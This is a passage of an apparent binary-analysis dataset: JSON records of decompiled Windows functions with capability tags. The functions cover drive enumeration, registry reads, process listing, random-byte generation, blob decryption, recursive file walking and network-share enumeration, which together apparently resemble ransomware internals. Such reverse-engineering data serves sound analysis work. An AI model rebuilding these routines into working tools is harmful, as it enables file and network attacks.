        "decompiled_code": "\nuint __cdecl fcn.00405139(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    if (arg_ch == 0) {\n        return 0;\n    }\n    uVar1 = (**0x413dd4)(arg_8h, 8, arg_ch);\n    return uVar1;\n}\n",
        "token_count": 77
    },
    "00405156": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405156(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0x100000;\n    if (arg_8h != 0) {\n        iVar1 = arg_8h;\n    }\n    (**0x413c98)(0, iVar1, 0);\n    return;\n}\n",
        "token_count": 80
    },
    "00405197": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405197(uint arg_8h)\n\n{\n    if (*0x421368 == 0) {\n        *0x421364 = (**0x413c98)(0, 0x100000, 0);\n        if (*0x421364 == 0) {\n            *0x421364 = (**0x413e30)();\n        }\n        *0x421368 = 1;\n    }\n    fcn.00405139(*0x421364, arg_8h);\n    return;\n}\n",
        "token_count": 116
    },
    "0040536d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040536d(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        (**0x413e24)(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 51
    },
    "00405526": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00405526(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint var_18h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar3 = 0;\n    var_4h = 0;\n    iVar2 = 0;\n    do {\n        if (iVar2 != 0) {\n            if ((iVar3 == 0) || (var_4h = fcn.00405197(iVar3 * 0x16),  var_4h == 0)) {\n                *arg_8h = 0;\n                return var_4h;\n            }\n            *arg_8h = iVar3;\n            iVar3 = 0;\n        }\n        var_10h = *0x40fcf0;\n        var_ch = *0x40fcf4;\n        if (*0x40fcf0 < 0x5b) {\n            puVar4 = var_4h + 0xe + iVar3 * 0x16;\n            do {\n                var_8h = (**0x413e1c)(&var_10h);\n                iVar1 = fcn.00408526(var_8h);\n                if (iVar1 != 0) {\n                    if (iVar2 != 0) {\n                        *(puVar4 + -0xe) = var_10h;\n                        puVar4[-3] = var_8h;\n                        iVar1 = (**0x413c20)(&var_10h, &var_18h, puVar4 + -2, puVar4);\n                        if (iVar1 == 0) {\n                            uVar5 = 0x4216a0;\n                            (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n                            fcn.00405082(7, L\"[DBG] \", uVar5);\n                            uVar5 = (**0x413d60)();\n                            fcn.00405082(8, L\"GetDiskFreeSpaceExW() last error = %08X\\r\\n\", uVar5);\n                            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n                            *puVar4 = 0;\n                            puVar4[1] = 0;\n                            puVar4[-2] = 0;\n                            puVar4[-1] = 0;\n                        }\n                    }\n                    iVar3 = iVar3 + 1;\n                    puVar4 = puVar4 + 0x16;\n                }\n                var_10h = var_10h & 0xffff0000 | var_10h + 1U;\n            } while (var_10h + 1U < 0x5b);\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 2);\n    return var_4h;\n}\n",
        "token_count": 670
    },
    "00405691": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint16_t * fcn.00405691(void)\n\n{\n    int16_t *piVar1;\n    uint var_94h;\n    uint var_30h;\n    uint var_2ch;\n    ushort var_1ah;\n    uint var_18h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00406625(0x420aa0, 0xa3, 6, 100, &var_94h);\n    var_30h._0_2_ = 0;\n    fcn.00406625(0x420aa0, 0x135, 8, 0xc, &var_18h);\n    var_ch._0_2_ = 0;\n    var_4h = 0;\n    piVar1 = fcn.00405f4f(0x80000002, &var_94h, &var_18h, &var_8h, &var_4h);\n    if (piVar1 != NULL) {\n        if (var_8h == 1) {\n            if (*piVar1 != 0) {\n                return piVar1;\n            }\n            fcn.00406625(0x420aa0, 0x7ec, 9, 0x12, &var_2ch);\n            var_1ah = 0;\n            fcn.004051e4(piVar1);\n            piVar1 = fcn.00406c56(&var_2ch);\n            return piVar1;\n        }\n        fcn.004051e4(piVar1);\n    }\n    return NULL;\n}\n",
        "token_count": 373
    },
    "004057ad": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.004057ad(void)\n\n{\n    int32_t arg_8h;\n    uint var_58h;\n    uint var_22h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00406625(0x420aa0, 0x3ba, 10, 0x36, &var_58h);\n    var_22h._0_2_ = 0;\n    fcn.00406625(0x420aa0, 0x529, 0xe, 0x14, &var_22h + 2);\n    var_4h = 0;\n    var_ch._0_2_ = 0;\n    arg_8h = fcn.00405f4f(0x80000001, &var_58h, &var_22h + 2, &var_8h, &var_4h);\n    if (arg_8h != 0) {\n        if (var_8h == 1) {\n            return arg_8h;\n        }\n        fcn.004051e4(arg_8h);\n    }\n    return 0;\n}\n",
        "token_count": 276
    },
    "00405943": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00405943(void)\n\n{\n    int32_t arg_8h;\n    uint var_7ch;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_ah;\n    uint var_4h;\n    \n    fcn.00406625(0x420aa0, 0x327, 9, 0x58, &var_7ch);\n    var_24h._0_2_ = 0;\n    fcn.00406625(0x420aa0, 0x79b, 9, 0x16, &var_20h);\n    var_4h = 0;\n    var_ah._0_2_ = 0;\n    arg_8h = fcn.00405f4f(0x80000002, &var_7ch, &var_20h, &var_ah + 2, &var_4h);\n    if (arg_8h != 0) {\n        if (stack0xfffffff4 == 1) {\n            return arg_8h;\n        }\n        fcn.004051e4(arg_8h);\n    }\n    return 0;\n}\n",
        "token_count": 274
    },
    "00405d77": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405d77(int32_t arg_8h, uint arg_ch, code *arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_22ch;\n    \n    iVar2 = 0;\n    arg_8h_00 = (**0x413d0c)(2, 0);\n    if (arg_8h_00 == -1) {\n        iVar2 = 0;\n    }\n    else {\n        var_22ch = 0x22c;\n        iVar1 = (**0x413d18)(arg_8h_00, &var_22ch);\n        while (iVar1 != 0) {\n            iVar2 = (*arg_10h)(arg_ch, &var_22ch);\n            if ((iVar2 != 0) && (arg_8h != 0)) break;\n            iVar1 = (**0x413c70)(arg_8h_00, &var_22ch);\n        }\n        fcn.0040536d(arg_8h_00);\n    }\n    return iVar2;\n}\n",
        "token_count": 255
    },
    "00405dee": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00405dee(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint unaff_EBP;\n    \n    iVar1 = fcn.00406256(arg_8h, arg_ch);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00405e5f(arg_8h, arg_ch);\n        if (iVar1 == 0) {\n            if (*0x421374 == 0) {\n                iVar1 = (**0x413bf4)(0x421370, 0, 0, 1, 0xf0000000, unaff_EBP);\n                if (iVar1 == 0) {\n                    return false;\n                }\n                *0x421374 = 1;\n            }\n            iVar1 = (**0x413c88)(*0x421370, arg_ch, arg_8h);\n            return iVar1 != 0;\n        }\n    }\n    return true;\n}\n",
        "token_count": 212
    },
    "00405e5f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00405e7a)\n\nint32_t __cdecl fcn.00405e5f(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    bool bVar5;\n    uint var_10h;\n    uint var_8h;\n    \n    if (*0x421378 == 0) {\n        iVar1 = cpuid_Version_info(1);\n        if ((*(iVar1 + 0xc) & 0x40000000) != 0) {\n            *0x42137c = 1;\n        }\n        *0x421378 = 1;\n    }\n    iVar1 = *0x42137c;\n    if ((*0x42137c != 0) && (uVar2 = 0,  arg_ch != 0)) {\n        do {\n            iVar3 = 0;\n            while( true ) {\n                uVar4 = rdrand();\n                bVar5 = rdrandIsValid();\n                if (bVar5) break;\n                iVar3 = iVar3 + 1;\n                if (0xf < iVar3) {\n                    return 0;\n                }\n            }\n            *(uVar2 + arg_8h) = uVar4;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return iVar1;\n}\n",
        "token_count": 325
    },
    "00406936": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406936(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t arg_10h_00;\n    int32_t arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((arg_8h != 0) && (arg_ch != 0)) && (arg_10h != 0)) {\n        iVar1 = fcn.00406ca4(arg_ch);\n        iVar2 = fcn.00406ca4(arg_10h);\n        iVar5 = 0;\n        iVar3 = fcn.00406eda(arg_8h, arg_ch);\n        if (iVar3 != 0) {\n            do {\n                iVar5 = iVar5 + 1;\n                iVar3 = fcn.00406eda(iVar3 + iVar1 * 2, arg_ch);\n            } while (iVar3 != 0);\n            if (iVar5 != 0) {\n                iVar3 = fcn.00406ca4(arg_8h);\n                iVar3 = fcn.00405197((iVar3 + (iVar2 - iVar1) * iVar5) * 2 + 2);\n                if (iVar3 != 0) {\n                    arg_8h_00 = arg_8h;\n                    arg_8h = iVar3;\n                    do {\n                        iVar5 = iVar5 + -1;\n                        iVar4 = fcn.00406eda(arg_8h_00, arg_ch);\n                        arg_10h_00 = iVar4 - arg_8h_00 >> 1;\n                        iVar4 = fcn.00406ded(arg_8h, arg_8h_00, arg_10h_00);\n                        arg_8h = fcn.00406bfb(iVar4 + arg_10h_00 * 2, arg_10h);\n                        arg_8h = arg_8h + iVar2 * 2;\n                        arg_8h_00 = arg_8h_00 + (iVar1 + arg_10h_00) * 2;\n                    } while (iVar5 != 0);\n                    fcn.00406bfb(arg_8h, arg_8h_00);\n                    return iVar3;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 561
    },
    "00406a2a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406a2a(uint8_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = *arg_8h;\n    while (uVar1 != 0) {\n        uVar1 = *arg_8h;\n        if (('@' < uVar1) && (uVar1 < '[')) {\n            *arg_8h = uVar1 | 0x20;\n        }\n        arg_8h = arg_8h + 1;\n        uVar1 = *arg_8h;\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "00406a7e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406a7e(uint8_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = *arg_8h;\n    while (uVar1 != 0) {\n        uVar1 = *arg_8h;\n        if (('`' < uVar1) && (uVar1 < '{')) {\n            *arg_8h = uVar1 & 0xdf;\n        }\n        arg_8h = arg_8h + 1;\n        uVar1 = *arg_8h;\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00406c21": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406c21(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h == 0) {\n        return 0;\n    }\n    iVar1 = fcn.00406c91(arg_8h);\n    iVar1 = fcn.00405197(iVar1 + 1);\n    if (iVar1 != 0) {\n        fcn.00406bdb(iVar1, arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 116
    },
    "00406c56": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406c56(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h == 0) {\n        return 0;\n    }\n    iVar1 = fcn.00406ca4(arg_8h);\n    iVar1 = fcn.00405197(iVar1 * 2 + 2);\n    if (iVar1 != 0) {\n        fcn.00406bfb(iVar1, arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 120
    },
    "00406e86": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00406e86(char *arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    \n    if (*arg_ch != '\\0') {\n        cVar1 = *arg_8h;\n        if (cVar1 != '\\0') {\n            iVar3 = arg_8h - arg_ch;\n            pcVar2 = arg_ch;\njoined_r0x00406ea9:\n            do {\n                if (cVar1 != '\\0') {\n                    if (*pcVar2 == '\\0') {\n                        return arg_8h;\n                    }\n                    if (pcVar2[iVar3] == *pcVar2) {\n                        cVar1 = (pcVar2 + 1)[iVar3];\n                        pcVar2 = pcVar2 + 1;\n                        goto joined_r0x00406ea9;\n                    }\n                }\n                if (*pcVar2 == '\\0') {\n                    return arg_8h;\n                }\n                arg_8h = arg_8h + 1;\n                iVar3 = iVar3 + 1;\n                cVar1 = *arg_8h;\n                pcVar2 = arg_ch;\n            } while (cVar1 != '\\0');\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 294
    },
    "00406f41": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.00406f41(uint8_t *arg_8h, uint8_t *arg_ch, uint8_t **arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint *puVar4;\n    uint var_20h;\n    \n    puVar4 = &var_20h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    do {\n        uVar1 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        *(&var_20h + (uVar1 >> 3)) = *(&var_20h + (uVar1 >> 3)) | 1 << (uVar1 & 7);\n    } while (uVar1 != 0);\n    if (arg_8h == NULL) {\n        arg_8h = *arg_10h;\n    }\n    for (; (uVar1 = *arg_8h,  puVar3 = arg_8h,  (*(&var_20h + (uVar1 >> 3)) & 1 << (uVar1 & 7)) != 0 && (uVar1 != 0));\n        arg_8h = arg_8h + 1) {\n    }\n    do {\n        if (*puVar3 == 0) {\ncode_r0x00406fc7:\n            *arg_10h = puVar3;\n            if (arg_8h == puVar3) {\n                arg_8h = NULL;\n            }\n            return arg_8h;\n        }\n        if ((*(&var_20h + (*puVar3 >> 3)) & 1 << (*puVar3 & 7)) != 0) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n            goto code_r0x00406fc7;\n        }\n        puVar3 = puVar3 + 1;\n    } while( true );\n}\n",
        "token_count": 474
    },
    "00407306": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407306(uint *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *arg_ch_00;\n    uint var_4h;\n    \n    iVar2 = fcn.00407229(arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        uVar3 = fcn.004065e5(arg_ch);\n        uVar1 = arg_8h[1];\n        arg_ch_00 = fcn.00405139(*arg_8h, 0xc);\n        if (arg_ch_00 != NULL) {\n            iVar2 = fcn.00406c21(arg_ch);\n            *arg_ch_00 = iVar2;\n            if (iVar2 != 0) {\n                iVar2 = fcn.004064cf(arg_ch);\n                arg_ch_00[1] = iVar2;\n                if (iVar2 != 0) {\n                    arg_ch_00[2] = *(arg_8h[2] + (uVar3 % uVar1) * 4);\n                    *(arg_8h[2] + (uVar3 % uVar1) * 4) = arg_ch_00;\n                    return 1;\n                }\n            }\n            if (*arg_ch_00 != 0) {\n                fcn.004051e4(*arg_ch_00);\n            }\n            if (arg_ch_00[1] != 0) {\n                fcn.004051e4(arg_ch_00[1]);\n            }\n            fcn.00405181(*arg_8h, arg_ch_00);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 377
    },
    "004073ab": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004073ab(uint *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *arg_ch_00;\n    uint var_4h;\n    \n    iVar2 = fcn.00407267(arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        uVar3 = fcn.00406603(arg_ch);\n        uVar1 = arg_8h[1];\n        arg_ch_00 = fcn.00405139(*arg_8h, 0xc);\n        if (arg_ch_00 != NULL) {\n            iVar2 = fcn.00407168(arg_ch);\n            *arg_ch_00 = iVar2;\n            if (iVar2 != 0) {\n                iVar2 = fcn.00406c56(arg_ch);\n                arg_ch_00[1] = iVar2;\n                if (iVar2 != 0) {\n                    arg_ch_00[2] = *(arg_8h[2] + (uVar3 % uVar1) * 4);\n                    *(arg_8h[2] + (uVar3 % uVar1) * 4) = arg_ch_00;\n                    return 1;\n                }\n            }\n            if (*arg_ch_00 != 0) {\n                fcn.004051e4(*arg_ch_00);\n            }\n            if (arg_ch_00[1] != 0) {\n                fcn.004051e4(arg_ch_00[1]);\n            }\n            fcn.00405181(*arg_8h, arg_ch_00);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 376
    },
    "004078e1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004078e1(uint arg_8h, int32_t *arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_10h_00;\n    uint var_20h;\n    \n    *arg_14h = 0;\n    if (arg_10h != 0) {\n        arg_10h_00 = arg_10h + -0x34;\n        iVar2 = arg_10h_00 + arg_ch;\n        iVar1 = fcn.00407642(0, arg_ch, arg_10h_00);\n        if (iVar1 == *(iVar2 + 0x30)) {\n            fcn.00407788(arg_8h, iVar2, &var_20h);\n            fcn.004075af(&var_20h, 0x100, iVar2 + 0x20, arg_ch, arg_10h_00);\n            fcn.004078cc(&var_20h, 0x20);\n            if (*arg_ch == 0) {\n                arg_10h = arg_10h + -0x38;\n                iVar2 = fcn.00405197(arg_10h);\n                if (iVar2 != 0) {\n                    fcn.00405228(iVar2, arg_ch + 1, arg_10h);\n                    *arg_14h = arg_10h;\n                    return iVar2;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 349
    },
    "004082ae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004082ae(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint *arg_8h_00;\n    bool bVar7;\n    ulong uVar8;\n    uint32_t var_268h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_23ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_8h = NULL;\n    var_10h = 0;\n    var_ch = 0;\n    iVar4 = (*arg_ch[1])(arg_8h, 0);\n    arg_8h_00 = NULL;\n    if (iVar4 != 0) {\n        fcn.004085ee(&var_10h, arg_8h);\n        uVar8 = (*arg_ch[10])(arg_ch[3], arg_8h, 0);\n        puVar1 = arg_ch + 6;\n        uVar5 = *puVar1;\n        *puVar1 = *puVar1 + uVar8;\n        arg_ch[7] = arg_ch[7] + (uVar8 >> 0x20) + CARRY4(uVar5, uVar8);\n        arg_8h_00 = var_8h;\n    }\n    while (*arg_ch == 0) {\n        uVar5 = var_10h | var_ch;\n        if (uVar5 != 0) {\n            fcn.00406bfb(arg_8h, *arg_8h_00);\n            puVar2 = arg_8h_00[1];\n            var_8h = puVar2;\n            fcn.004051e4(*arg_8h_00);\n            fcn.004051e4(arg_8h_00);\n            bVar7 = var_10h != 0;\n            var_10h = var_10h - 1;\n            var_ch = (var_ch - 1) + bVar7;\n            if ((var_10h | var_ch) == 0) {\n                var_4h = 0;\n            }\n            uVar5 = 1;\n            arg_8h_00 = puVar2;\n        }\n        if (uVar5 == 0) break;\n        var_14h = fcn.00406ca4(arg_8h);\n        fcn.00406af4(arg_8h, 0x40ff48);\n        iVar4 = (**0x413dec)(arg_8h, &var_268h);\n        if (iVar4 != -1) {\n            do {\n                iVar6 = fcn.00406b9a(&var_23ch, 0x40f490);\n                if (((iVar6 != 0) && (iVar6 = fcn.00406b9a(&var_23ch, 0x40ff40),  iVar6 != 0)) &&\n                   ((var_268h & 0x400) == 0)) {\n                    fcn.00406bfb(arg_8h + var_14h * 2, &var_23ch);\n                    uVar3 = var_248h;\n                    if ((var_268h & 0x10) == 0) {\n                        var_18h = var_24ch;\n                        iVar6 = (*arg_ch[2])(arg_8h, &var_23ch, var_248h, var_24ch);\n                        if (iVar6 != 0) {\n                            uVar8 = (*arg_ch[0xb])(arg_ch[4], arg_8h, &var_23ch, uVar3, var_18h);\n                            puVar1 = arg_ch + 8;\n                            uVar5 = *puVar1;\n                            *puVar1 = *puVar1 + uVar8;\n                            arg_ch[9] = arg_ch[9] + (uVar8 >> 0x20) + CARRY4(uVar5, uVar8);\n                        }\n                    }\n                    else {\n                        fcn.00406af4(arg_8h, 0x40ff4c);\n                        iVar6 = (*arg_ch[1])(arg_8h, &var_23ch);\n                        if (iVar6 != 0) {\n                            fcn.004085ee(&var_10h, arg_8h);\n                            uVar8 = (*arg_ch[10])(arg_ch[3], arg_8h, &var_23ch);\n                            puVar1 = arg_ch + 6;\n                            uVar5 = *puVar1;\n                            *puVar1 = *puVar1 + uVar8;\n                            arg_ch[7] = arg_ch[7] + (uVar8 >> 0x20) + CARRY4(uVar5, uVar8);\n                        }\n                    }\n                }\n            } while ((*arg_ch == 0) && (iVar6 = (**0x413e0c)(iVar4, &var_268h),  iVar6 != 0));\n            (**0x413d74)(iVar4);\n            arg_8h_00 = var_8h;\n        }\n    }\n    while (arg_8h_00 != NULL) {\n        puVar2 = arg_8h_00[1];\n        fcn.004051e4(*arg_8h_00);\n        fcn.004051e4(arg_8h_00);\n        arg_8h_00 = puVar2;\n    }\n    return;\n}\n",
        "token_count": 1279
    },
    "00408539": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00408539(uint arg_8h)\n\n{\n    int16_t *arg_8h_00;\n    uint32_t uVar1;\n    \n    arg_8h_00 = (**0x413bf0)(arg_8h);\n    if ((*arg_8h_00 == 0x2e) && (uVar1 = fcn.00406ca4(arg_8h_00),  1 < uVar1)) {\n        return arg_8h_00 + 1;\n    }\n    return NULL;\n}\n",
        "token_count": 125
    },
    "00408728": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00408728(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    bool bVar5;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = (**0x413c78)(2, 1, 0, arg_ch, &var_8h);\n    if (iVar1 == 0) {\n        var_4h = 0xffffffff;\n        var_ch = 0x4000;\n        iVar1 = fcn.00405197(0x4000);\n        if (iVar1 == 0) {\n            (**0x413e14)(var_8h);\n            bVar5 = false;\n        }\n        else {\ncode_r0x00408775:\n            do {\n                iVar2 = (**0x413db4)(var_8h, &var_4h, iVar1, &var_ch);\n                if (iVar2 == 0) {\n                    uVar3 = 0;\n                    if (var_4h == 0) goto code_r0x00408775;\n                    puVar4 = iVar1 + 0x14;\n                    do {\n                        if (puVar4[-4] == 1) {\n                            fcn.00408580(*puVar4, arg_8h);\n                        }\n                        if ((*(puVar4 + -2) & 2) != 0) {\n                            fcn.00408728(arg_8h, puVar4 + -5);\n                        }\n                        uVar3 = uVar3 + 1;\n                        puVar4 = puVar4 + 8;\n                    } while (uVar3 < var_4h);\n                }\n            } while (iVar2 != 0x103);\n            fcn.004051e4(iVar1);\n            iVar1 = (**0x413e14)(var_8h);\n            bVar5 = iVar1 == 0;\n        }\n    }\n    else 